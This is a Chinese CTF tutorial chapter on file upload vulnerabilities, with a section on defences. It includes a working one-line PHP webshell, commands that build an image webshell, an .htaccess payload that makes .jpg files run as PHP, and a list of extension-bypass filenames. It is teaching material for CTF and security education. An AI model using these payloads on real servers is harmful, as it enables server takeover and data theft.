# 第 8 章 文件上传漏洞与 WebShell

## 本章目标

读完这一章，你将能够：

- 理解文件上传漏洞的本质："服务器存了不该存的文件"
- 知道什么是 WebShell，它为什么危险
- 掌握前端校验绕过、黑名单绕过、MIME 绕过、文件头绕过等经典手法
- 理解 .htaccess 解析漏洞、条件竞争等进阶技巧
- 知道如何防御文件上传漏洞

> 文件上传是 CTF 里"花样最多"的考点——因为防御方式五花八门，绕过手法也层出不穷。这一章把常见套路系统梳理一遍，让你面对上传题时有思路可循。

---

## 8.1 本质：让服务器保存并执行你的文件

很多网站允许用户上传文件：头像、附件、图片、文档。如果服务器对用户上传的文件**不加限制**，攻击者就能上传一个**可执行的恶意脚本**——比如一个 PHP 文件。

如果这个 PHP 文件被保存到 Web 目录，攻击者访问它的 URL，服务器就会**执行**这个脚本。这就是 **WebShell（网页后门）**——一个能通过浏览器操控服务器的"遥控器"。

**核心一句话**：**服务器保存了恶意文件，并且在访问时把它当成代码执行了。**

```
攻击者 → 上传 shell.php（内容是恶意 PHP 代码）
       → 服务器保存到 /uploads/shell.php
       → 攻击者访问 http://site.com/uploads/shell.php
       → 服务器执行 shell.php
       → 攻击者获得服务器控制权（读文件、执行命令）
```

---

## 8.2 WebShell 是什么

WebShell 是用服务端语言（PHP/JSP/ASP）写的"网页版命令行"。最小的一句 PHP WebShell：

```php
<?php system($_GET['cmd']); ?>
```

含义：把 URL 参数 `cmd` 的值当成系统命令执行。

```
上传 shell.php 后访问：
http://site.com/uploads/shell.php?cmd=whoami
→ 服务器执行 whoami，页面显示当前用户

http://site.com/uploads/shell.php?cmd=cat /flag
→ 读取 flag 文件，页面显示 flag
```

**CTF 里的典型目标**：上传 WebShell → 用 `cmd` 参数读 `/flag` 或当前目录下的 flag 文件。有时题目环境禁用了 `system` 等函数，就要换其他函数（这是进阶内容）。

**小白问：WebShell 很危险吗？**
> 极其危险。有了 WebShell，攻击者能读服务器上的任何文件（数据库配置、源码、其他用户数据）、执行系统命令、甚至横向渗透内网。真实世界里，文件上传漏洞是拿下服务器权限的常见入口。CTF 里它是"拿到 flag"的便捷通道。

---

## 8.3 前端校验的绕过

很多网站在**浏览器端**用 JavaScript 检查文件类型（比如只允许 .jpg）。这是最弱的防御——因为客户端代码攻击者完全可控。

**绕过方法**：

1. **改包**：正常上传一个 `shell.jpg`（内容其实是 PHP），用 Burp 拦截请求，把文件名改回 `shell.php`
2. **禁用 JS**：浏览器禁用 JavaScript，前端校验直接失效
3. **改 HTML**：用开发者工具把前端的校验函数删掉

**判断方法**：如果上传时弹窗提示"只允许 jpg"且请求**根本没发出**，说明是前端校验——改包即可绕过。

---

## 8.4 服务端黑名单绕过（核心考点）

服务端会检查文件扩展名，常见的是**黑名单**（禁止 .php/.jsp/.asp 等）。绕过方法：

### 8.4.1 等价扩展名

PHP 有多种可执行扩展名，黑名单可能没列全：

```
.php, .php3, .php4, .php5, .php7, .phtml, .phps, .pht
```

试试把 `shell.php` 改成 `shell.phtml`——如果服务器仍把它当 PHP 解析，就绕过了。

### 8.4.2 大小写绕过

```
shell.PHP, shell.Php
```

如果黑名单只匹配小写，大小写混写能绕过。

### 8.4.3 点空格绕过

```
shell.php.    （末尾加点）
shell.php     （末尾加空格，用 Burp 改包）
shell.php::$DATA  （Windows NTFS 数据流特性）
```

这些"畸形"文件名在某些服务器上会被"规范化"成 `.php`，从而绕过检查又被当 PHP 执行。

### 8.4.4 双写绕过

如果服务器把危险扩展名**替换为空**（而不是拒绝），可以双写：

```
shell.pphphp  → 服务器删掉其中的 "php" → 变成 shell.php
```

### 8.4.5 %00 截断（经典）

在老版本 PHP（<5.3.4）里，`%00` 是字符串结束符，能截断后面的检查：

```
文件名：shell.php%00.jpg
服务器检查时看到 .jpg（通过），但保存时 %00 后面的被截断 → 实际存为 shell.php
```

**注意**：这是老漏洞，现代环境大多已修复，但 CTF 里仍有老靶场考它。

## 8.5 MIME 与文件头绕过

### 8.5.1 Content-Type（MIME）检查

服务器可能检查请求的 `Content-Type` 头是否为图片类型（如 `image/jpeg`）。用 Burp 抓包，把上传 PHP 文件时的 `Content-Type` 从 `application/octet-stream` 改成 `image/jpeg` 即可绕过。

### 8.5.2 文件头（幻数）检查

服务器可能读文件的前几个字节，判断是不是真图片。绕过方法：**在恶意脚本前面加上图片文件头（magic number）**：

```bash
# GIF 文件头 GIF89a + PHP 代码
# 用命令合成：
echo -e "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.gif
```

或者用工具把 PHP 代码**追加到真实图片末尾**：

```bash
cat real.jpg shell.php > shell.jpg
```

这样文件头是真的图片，但里面藏了 PHP 代码。如果服务器用 `include` 等方式解析（而非严格图片处理），代码就会执行。

**图片马**：这种"图片里藏 PHP 代码"的文件叫**图片马**，是上传题的经典 payload。

---

## 8.6 解析漏洞：服务器"看错"文件类型

有些漏洞不在上传检查，而在**服务器解析**环节——即使你上传的是图片扩展名，服务器也可能把它当脚本执行。

### 8.6.1 Apache 解析漏洞

Apache 从右往左识别扩展名。如果配置不当，`shell.jpg.php` 这类文件可能被当 PHP 执行（因为最右是 .php）。反过来，有些配置下 `shell.php.jpg` 也会因多后缀被解析为 PHP。

### 8.6.2 Nginx 解析漏洞

经典案例：**PATH_INFO 解析**。访问 `/uploads/shell.jpg/x.php` 时，Nginx 可能把 `shell.jpg` 当 PHP 脚本执行（视版本和配置而定）。

### 8.6.3 .htaccess 攻击

如果服务器允许上传 `.htaccess` 文件（Apache 的目录配置文件），你可以上传一个让"特定扩展名被当 PHP 解析"的配置：

```apache
AddType application/x-httpd-php .jpg
```

上传后，`shell.jpg`（内容是 PHP）就会被当 PHP 执行。这是 CTF 上传题的常见考点。

---

## 8.7 条件竞争（进阶）

有些服务器先保存文件，再检查/删除不合法文件。如果检查有延迟，攻击者可以**在文件被删除前访问它**——用大量并发请求"抢"在那个时间窗内执行 WebShell。

手法：用 Burp 的 Intruder 或脚本，一边不断上传，一边不断访问 shell.php，总有一次能"抢"到。这就是条件竞争，需要点脚本能力（第 24 章的 Python 基础能派上用场）。

---

## 8.8 完整实战流程

拿到一道上传题，按这个顺序试：

```
1. 看前端：是否前端校验？改包绕过
2. 看提示：允许什么类型？服务端是黑名单还是白名单？
3. 传正常文件：观察上传后的路径（文件存到哪、怎么命名）
4. 传 shell.php：看服务端如何拒绝（提示什么？）
5. 按拒绝原因选绕过手法：
   - 前端校验 → 改包
   - 扩展名黑名单 → 等价扩展/大小写/点空格/双写
   - MIME 检查 → 改 Content-Type
   - 文件头检查 → 加图片头/图片马
   - 解析漏洞 → 配合 .htaccess / 多后缀
6. 访问 WebShell，用 cmd 参数读 flag
```

**关键**：**观察服务端的反应**（报什么错、存成了什么名字），据此选择绕过手法，而不是把所有 payload 乱试一遍。

## 8.9 文件上传的防御

| 措施 | 作用 |
|------|------|
| **白名单**扩展名（而非黑名单） | 只放行必要的类型，如 jpg/png |
| 重命名文件 | 用随机名+固定白名单后缀，不信任用户文件名 |
| 检查/重写文件内容 | 用函数重新渲染图片（如 PHP 的 `imagecreatefromjpeg` + `imagejpeg`），把夹带的 PHP 代码破坏掉；或用 `getimagesize` 校验是否为真图片 |
| 禁止执行权限 | 上传目录设置为不可执行脚本 |
| 隔离存储 | 把上传文件放在 Web 根目录之外，通过脚本代理访问 |
| 校验 MIME + 文件头 | 辅助手段 |

**CTF 对应关系**：上传题的"防御等级"就是逐步叠加这些措施——从纯前端校验（Low）到白名单+重命名+内容检查（Impossible）。理解每种防御，就能理解为什么某种绕过会失败。

## 8.10 本章总结

| 知识点 | 核心要点 |
|--------|---------|
| 漏洞本质 | 服务器保存并执行了恶意文件 |
| WebShell | `<?php system($_GET['cmd']); ?>`，浏览器操控服务器的遥控器 |
| 前端校验 | 改包/禁 JS 绕过（最弱） |
| 黑名单绕过 | 等价扩展名、大小写、点空格、双写、%00 截断 |
| MIME/文件头 | 改 Content-Type、加图片头、图片马 |
| 解析漏洞 | Apache/Nginx 解析、.htaccess 攻击 |
| 条件竞争 | 利用检查与删除的时间窗 |
| 防御 | 白名单+重命名+内容检查+禁执行+隔离存储 |
